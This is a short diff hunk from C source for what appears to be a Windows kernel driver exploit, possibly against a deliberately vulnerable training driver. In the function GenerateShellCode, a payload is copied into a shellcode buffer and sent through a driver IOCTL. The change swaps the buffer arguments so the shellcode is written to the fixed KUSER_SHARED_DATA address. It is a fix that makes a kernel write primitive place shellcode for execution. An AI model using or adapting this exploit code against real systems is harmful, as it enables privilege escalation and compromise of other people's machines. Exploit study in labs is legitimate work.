@@ -307,7 +307,7 @@ void *GenerateShellCode(HANDLE driverHandle)
 
     RtlMoveMemory(shellcode,fakepayload,strlen( (const char*) fakepayload));
 
-    SendToDriver(driverHandle,0x0022200B,(void*)KUSER_SHARED_DATA, (void*)shellcode);
+    SendToDriver(driverHandle,0x0022200B,(void*)shellcode,(void*)KUSER_SHARED_DATA);
 
     return (void*) KUSER_SHARED_DATA;
 }
